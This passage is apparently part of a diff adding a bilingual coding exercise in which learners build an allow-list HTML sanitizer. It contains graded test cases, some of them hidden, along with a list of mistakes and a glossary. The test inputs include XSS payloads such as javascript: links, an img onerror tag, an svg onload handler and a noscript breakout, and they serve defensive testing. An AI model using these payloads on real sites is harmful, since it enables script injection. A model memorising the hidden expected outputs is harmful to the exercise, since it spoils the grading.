res.ended, next };\n}\nfunction bytes(s) { const a = []; for (let i = 0; i < s.length; i++) a.push(s.charCodeAt(i) & 255); return a; }\n",
+            "mongDoi": "after"
+          },
+          {
+            "moTa": {
+              "en": "javascript: href removed, https href kept",
+              "vi": "Bỏ href javascript:, giữ href https"
+            },
+            "goi": "sanitize([{ tag: 'a', attrs: { href: 'javascript:alert(1)' }, children: ['Click here'] }, ' ', { tag: 'a', attrs: { href: 'https://cuongthai.com', target: '_blank' }, children: ['here'] }])",
+            "chuanBi": "\nfunction makeRes() {\n  const r = { statusCode: 200, headers: {}, body: undefined, ended: false };\n  const k = (x) => String(x).toLowerCase();\n  r.status = (s) => { r.statusCode = s; return r; };\n  r.setHeader = (n, v) => { r.headers[k(n)] = Array.isArray(v) ? v.join(', ') : String(v); return r; };\n  r.set = (n, v) => { if (typeof n === 'object') { for (const x of Object.keys(n)) r.setHeader(x, n[x]); return r; } return r.setHeader(n, v); };\n  r.header = r.set;\n  r.getHeader = (n) => r.headers[k(n)];\n  r.get = r.getHeader;\n  r.removeHeader = (n) => { delete r.headers[k(n)]; };\n  r.append = (n, v) => { const o = r.headers[k(n)]; r.headers[k(n)] = o ? o + ', ' + v : String(v); return r; };\n  r.vary = (f) => { const o = r.headers.vary; if (!o) r.headers.vary = f; else if (!o.split(/\\s*,\\s*/).map(k).includes(k(f))) r.headers.vary = o + ', ' + f; return r; };\n  r.json = (b) => { if (r.ended) throw new Error('Cannot set headers after they are sent to the client'); r.body = b; r.ended = true; if (!r.headers['content-type']) r.headers['content-type'] = 'application/json; charset=utf-8'; return r; };\n  r.send = (b) => { if (r.ended) throw new Error('Cannot set headers after they are sent to the client'); r.body = b; r.ended = true; return r; };\n  r.end = (b) => { if (r.ended) throw new Error('Cannot set headers after they are sent to the client'); r.body = b === undefined ? null : b; r.ended = true; return r; };\n  r.sendStatus = (s) => { r.statusCode = s; return r.end(); };\n  r.redirect = (a, b) => { if (b === undefined) { b = a; a = 302; } r.statusCode = a; r.headers.location = String(b); return r.end(); };\n  return r;\n}\nasync function runMw(mw, req, res) {\n  res = res || makeRes();\n  req = req || {};\n  if (!req.headers) req.headers = {};\n  const next = [];\n  await mw(req, res, (err) => { next.push(err === undefined ? 'next' : 'next:' + (err && err.message !== undefined ? err.message : String(err))); });\n  return { status: res.statusCode, headers: res.headers, body: res.body === undefined ? null : res.body, ended: res.ended, next };\n}\nfunction bytes(s) { const a = []; for (let i = 0; i < s.length; i++) a.push(s.charCodeAt(i) & 255); return a; }\n",
+            "mongDoi": "<a>Click here</a> <a href=\"https://cuongthai.com\">here</a>"
+          },
+          {
+            "moTa": {
+              "en": "Hidden case 4",
+              "vi": "Ca ẩn 4"
+            },
+            "goi": "sanitize([{ tag: 'SCRIPT', children: ['alert(1)'] }, { tag: 'svg', attrs: { onload: 'alert(1)' }, children: [{ tag: 'b', children: ['x'] }] }, { tag: 'div', attrs: { style: 'color:red' }, children: [{ tag: 'P', children: ['ok'] }] }])",
+            "chuanBi": "\nfunction makeRes() {\n  const r = { statusCode: 200, headers: {}, body: undefined, ended: false };\n  const k = (x) => String(x).toLowerCase();\n  r.status = (s) => { r.statusCode = s; return r; };\n  r.setHeader = (n, v) => { r.headers[k(n)] = Array.isArray(v) ? v.join(', ') : String(v); return r; };\n  r.set = (n, v) => { if (typeof n === 'object') { for (const x of Object.keys(n)) r.setHeader(x, n[x]); return r; } return r.setHeader(n, v); };\n  r.header = r.set;\n  r.getHeader = (n) => r.headers[k(n)];\n  r.get = r.getHeader;\n  r.removeHeader = (n) => { delete r.headers[k(n)]; };\n  r.append = (n, v) => { const o = r.headers[k(n)]; r.headers[k(n)] = o ? o + ', ' + v : String(v); return r; };\n  r.vary = (f) => { const o = r.headers.vary; if (!o) r.headers.vary = f; else if (!o.split(/\\s*,\\s*/).map(k).includes(k(f))) r.headers.vary = o + ', ' + f; return r; };\n  r.json = (b) => { if (r.ended) throw new Error('Cannot set headers after they are sent to the client'); r.body = b; r.ended = true; if (!r.headers['content-type']) r.headers['content-type'] = 'application/json; charset=utf-8'; return r; };\n  r.send = (b) => { if (r.ended) throw new Error('Cannot set headers after they are sent to the client'); r.body = b; r.ended = true; return r; };\n  r.end = (b) => { if (r.ended) throw new Error('Cannot set headers after they are sent to the client'); r.body = b === undefined ? null : b; r.ended = true; return r; };\n  r.sendStatus = (s) => { r.statusCode = s; return r.end(); };\n  r.redirect = (a, b) => { if (b === undefined) { b = a; a = 302; } r.statusCode = a; r.headers.location = String(b); return r.end(); };\n  return r;\n}\nasync function runMw(mw, req, res) {\n  res = res || makeRes();\n  req = req || {};\n  if (!req.headers) req.headers = {};\n  const next = [];\n  await mw(req, res, (err) => { next.push(err === undefined ? 'next' : 'next:' + (err && err.message !== undefined ? err.message : String(err))); });\n  return { status: res.statusCode, headers: res.headers, body: res.body === undefined ? null : res.body, ended: res.ended, next };\n}\nfunction bytes(s) { const a = []; for (let i = 0; i < s.length; i++) a.push(s.charCodeAt(i) & 255); return a; }\n",
+            "mongDoi": "<p>ok</p>",
+            "an": true
+          },
+          {
+            "moTa": {
+              "en": "Hidden case 5",
+              "vi": "Ca ẩn 5"
+            },
+            "goi": "sanitize(['<img src=x onerror=alert(1)>', { tag: 'br' }, { tag: 'noscript', children: [{ tag: 'p', attrs: { title: '</noscript><img src=x onerror=alert(1)>' } }] }])",
+            "chuanBi": "\nfunction makeRes() {\n  const r = { statusCode: 200, headers: {}, body: undefined, ended: false };\n  const k = (x) => String(x).toLowerCase();\n  r.status = (s) => { r.statusCode = s; return r; };\n  r.setHeader = (n, v) => { r.headers[k(n)] = Array.isArray(v) ? v.join(', ') : String(v); return r; };\n  r.set = (n, v) => { if (typeof n === 'object') { for (const x of Object.keys(n)) r.setHeader(x, n[x]); return r; } return r.setHeader(n, v); };\n  r.header = r.set;\n  r.getHeader = (n) => r.headers[k(n)];\n  r.get = r.getHeader;\n  r.removeHeader = (n) => { delete r.headers[k(n)]; };\n  r.append = (n, v) => { const o = r.headers[k(n)]; r.headers[k(n)] = o ? o + ', ' + v : String(v); return r; };\n  r.vary = (f) => { const o = r.headers.vary; if (!o) r.headers.vary = f; else if (!o.split(/\\s*,\\s*/).map(k).includes(k(f))) r.headers.vary = o + ', ' + f; return r; };\n  r.json = (b) => { if (r.ended) throw new Error('Cannot set headers after they are sent to the client'); r.body = b; r.ended = true; if (!r.headers['content-type']) r.headers['content-type'] = 'application/json; charset=utf-8'; return r; };\n  r.send = (b) => { if (r.ended) throw new Error('Cannot set headers after they are sent to the client'); r.body = b; r.ended = true; return r; };\n  r.end = (b) => { if (r.ended) throw new Error('Cannot set headers after they are sent to the client'); r.body = b === undefined ? null : b; r.ended = true; return r; };\n  r.sendStatus = (s) => { r.statusCode = s; return r.end(); };\n  r.redirect = (a, b) => { if (b === undefined) { b = a; a = 302; } r.statusCode = a; r.headers.location = String(b); return r.end(); };\n  return r;\n}\nasync function runMw(mw, req, res) {\n  res = res || makeRes();\n  req = req || {};\n  if (!req.headers) req.headers = {};\n  const next = [];\n  await mw(req, res, (err) => { next.push(err === undefined ? 'next' : 'next:' + (err && err.message !== undefined ? err.message : String(err))); });\n  return { status: res.statusCode, headers: res.headers, body: res.body === undefined ? null : res.body, ended: res.ended, next };\n}\nfunction bytes(s) { const a = []; for (let i = 0; i < s.length; i++) a.push(s.charCodeAt(i) & 255); return a; }\n",
+            "mongDoi": "&lt;img src=x onerror=alert(1)&gt;<br>",
+            "an": true
+          },
+          {
+            "moTa": {
+              "en": "Hidden case 6",
+              "vi": "Ca ẩn 6"
+            },
+            "goi": "sanitize([{ tag: 'p', children: ['Ghi chú ', { tag: 'b', children: ['quan trọng'] }, ': xem ', { tag: 'a', attrs: { href: '/notes/1?a=1&b=\"2\"' }, children: ['tại đây'] }] }, { tag: 'ul', children: [{ tag: 'li', children: ['1 < 2'] }] }])",
+            "chuanBi": "\nfunction makeRes() {\n  const r = { statusCode: 200, headers: {}, body: undefined, ended: false };\n  const k = (x) => String(x).toLowerCase();\n  r.status = (s) => { r.statusCode = s; return r; };\n  r.setHeader = (n, v) => { r.headers[k(n)] = Array.isArray(v) ? v.join(', ') : String(v); return r; };\n  r.set = (n, v) => { if (typeof n === 'object') { for (const x of Object.keys(n)) r.setHeader(x, n[x]); return r; } return r.setHeader(n, v); };\n  r.header = r.set;\n  r.getHeader = (n) => r.headers[k(n)];\n  r.get = r.getHeader;\n  r.removeHeader = (n) => { delete r.headers[k(n)]; };\n  r.append = (n, v) => { const o = r.headers[k(n)]; r.headers[k(n)] = o ? o + ', ' + v : String(v); return r; };\n  r.vary = (f) => { const o = r.headers.vary; if (!o) r.headers.vary = f; else if (!o.split(/\\s*,\\s*/).map(k).includes(k(f))) r.headers.vary = o + ', ' + f; return r; };\n  r.json = (b) => { if (r.ended) throw new Error('Cannot set headers after they are sent to the client'); r.body = b; r.ended = true; if (!r.headers['content-type']) r.headers['content-type'] = 'application/json; charset=utf-8'; return r; };\n  r.send = (b) => { if (r.ended) throw new Error('Cannot set headers after they are sent to the client'); r.body = b; r.ended = true; return r; };\n  r.end = (b) => { if (r.ended) throw new Error('Cannot set headers after they are sent to the client'); r.body = b === undefined ? null : b; r.ended = true; return r; };\n  r.sendStatus = (s) => { r.statusCode = s; return r.end(); };\n  r.redirect = (a, b) => { if (b === undefined) { b = a; a = 302; } r.statusCode = a; r.headers.location = String(b); return r.end(); };\n  return r;\n}\nasync function runMw(mw, req, res) {\n  res = res || makeRes();\n  req = req || {};\n  if (!req.headers) req.headers = {};\n  const next = [];\n  await mw(req, res, (err) => { next.push(err === undefined ? 'next' : 'next:' + (err && err.message !== undefined ? err.message : String(err))); });\n  return { status: res.statusCode, headers: res.headers, body: res.body === undefined ? null : res.body, ended: res.ended, next };\n}\nfunction bytes(s) { const a = []; for (let i = 0; i < s.length; i++) a.push(s.charCodeAt(i) & 255); return a; }\n",
+            "mongDoi": "<p>Ghi chú <b>quan trọng</b>: xem <a href=\"/notes/1?a=1&amp;b=&quot;2&quot;\">tại đây</a></p><ul><li>1 &lt; 2</li></ul>",
+            "an": true
+          }
+        ]
+      },
+      "gradeKind": "js",
+      "kind": "practice",
+      "mistakesJson": [
+        {
+          "loi": "Unwrapping <code>&lt;script&gt;</code> instead of dropping it: its text child <code>alert(1)</code> survives into the note.|||Gỡ vỏ <code>&lt;script&gt;</code> thay vì bỏ hẳn: con chữ <code>alert(1)</code> của nó còn lại trong ghi chú."
+        },
+        {
+          "loi": "Keeping attributes with a deny-list (remove on*): <code>style</code>, <code>src</code>, <code>formaction</code> slip through.|||Giữ thuộc tính theo danh sách đen (bỏ on*): <code>style</code>, <code>src</code>, <code>formaction</code> lọt qua."
+        },
+        {
+          "loi": "Forgetting to escape text: a text node <code>\"&lt;img onerror=…&gt;\"</code> becomes a real tag again when serialised.|||Quên escape chữ: nút chữ <code>\"&lt;img onerror=…&gt;\"</code> lại thành thẻ thật khi ghi ra."
+        }
+      ],
+      "glossaryJson": [
+        {
+          "en": "allow-list sanitizer",
+          "vi": "bộ làm sạch danh sách trắng",
+          "giaiThich": "chỉ giữ thẻ/thuộc tính được liệt kê"
+        },
+        {
+          "en": "unwrap",
+          "vi": "gỡ vỏ",
+          "giaiThich": "bỏ thẻ, giữ nội dung bên trong"
+        },
+        {
+          "en": "serialise",
+          "vi": "tuần tự hoá",
+          "giaiThich": "ghi cây DOM trở lại thành chuỗi HTML"
+        }
+      ]
+    }
+  ]
+}
